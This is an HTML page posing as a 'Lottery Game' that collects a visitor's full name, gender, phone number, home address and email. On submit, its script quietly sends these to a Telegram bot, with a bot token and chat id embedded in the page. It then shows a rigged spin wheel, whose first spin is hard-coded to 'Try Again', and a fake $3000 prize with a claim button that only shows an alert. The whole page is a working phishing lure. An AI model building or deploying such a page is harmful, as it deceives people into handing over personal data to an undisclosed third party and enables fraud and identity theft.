<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lottery Game</title>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; background: linear-gradient(135deg, #f8f9fa, #d1e7fd); color: #333; padding: 20px; }
        input { width: 90%; padding: 15px; margin: 10px; font-size: 18px; border-radius: 5px; border: 2px solid #ddd; }
        .button { background: blue; padding: 15px; color: white; font-size: 20px; cursor: pointer; border-radius: 5px; width: 90%; max-width: 300px; border: none; }
        .hidden { display: none; }
        .wheel-container { position: relative; width: 300px; height: 300px; margin: 30px auto; }
        .wheel { width: 100%; height: 100%; border-radius: 50%; position: absolute; transition: transform 3s ease-out; background: conic-gradient(
            red 0deg 45deg, yellow 45deg 90deg, green 90deg 135deg, blue 135deg 180deg, 
            purple 180deg 225deg, orange 225deg 270deg, cyan 270deg 315deg, pink 315deg 360deg
        ); }
        .pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 20px solid transparent; border-right: 20px solid transparent; border-bottom: 40px solid red; }
        footer { margin-top: 50px; font-size: 18px; color: #555; }
    </style>
</head>
<body>

    <h1>🎰 Lottery Game 🎰</h1>

    <div id="form-container">
        <h2>Enter Your Details</h2>
        <input type="text" id="name" placeholder="👤 Full Name">
        <input type="text" id="gender" placeholder="🚻 Gender">
        <input type="text" id="phone" placeholder="📞 Phone Number">
        <input type="text" id="address" placeholder="🏠 Home Address">
        <input type="email" id="email" placeholder="📧 Email">
        <button class="button" onclick="submitForm()">Submit</button>
    </div>

    <button id="scan-btn" class="button hidden" onclick="startLottery()">Scan Lotteries</button>

    <div id="lottery-names"></div>

    <div id="loading" class="hidden">
        <p>Loading your personal Lottery game...</p>
        <div class="loading-bar"><div id="progress"></div></div>
    </div>

    <button id="go-btn" class="button hidden" onclick="startWheel()">Go for it</button>

    <div id="wheel-container" class="hidden">
        <div class="pointer"></div>
        <div id="wheel" class="wheel"></div>
        <button class="button" onclick="spinWheel()">Spin</button>
    </div>

    <div id="congrats" class="hidden">
        <h2>Congratulations! 🎉</h2>
        <p>You've won $3000!</p>
        <button class="button" onclick="alert('Your prize claim is being processed!')">Claim Prize</button>
    </div>

    <footer>© 2024 Lottery Game. All rights reserved.</footer>

    <script>
        function submitForm() {
            let botToken = "<7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY>";
            let chatId = "<874563737>";
            let data = {
                name: document.getElementById("name").value,
                gender: document.getElementById("gender").value,
                phone: document.getElementById("phone").value,
                address: document.getElementById("address").value,
                email: document.getElementById("email").value
            };

            let message = `📢 New Lottery Entry:\n\n👤 Name: ${data.name}\n🚻 Gender: ${data.gender}\n📞 Phone: ${data.phone}\n🏠 Address: ${data.address}\n📧 Email: ${data.email}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                .then(() => {
                    document.getElementById("form-container").style.display = "none";
                    document.getElementById("scan-btn").style.display = "block";
                })
                .catch(error => console.error('Error:', error));
        }

        function startWheel() {
            document.getElementById("go-btn").style.display = "none";
            document.getElementById("wheel-container").style.display = "block";
        }

        let spinCount = 0;
        function spinWheel() {
            let wheel = document.getElementById("wheel");
            let firstSpin = 360 * 3 + 320;  // Lands on "Try Again"
            let secondSpin = 360 * 3 + [40, 80, 120, 160, 200, 240, 280][Math.floor(Math.random() * 7)];  // Lands on 1-8

            if (spinCount === 0) {
                wheel.style.transform = `rotate(${firstSpin}deg)`;
                spinCount++;
            } else {
                wheel.style.transform = `rotate(${secondSpin}deg)`;
                setTimeout(() => {
                    document.getElementById("wheel-container").style.display = "none";
                    document.getElementById("congrats").style.display = "block";
                }, 3000);
            }
        }
    </script>

</body>
</html>
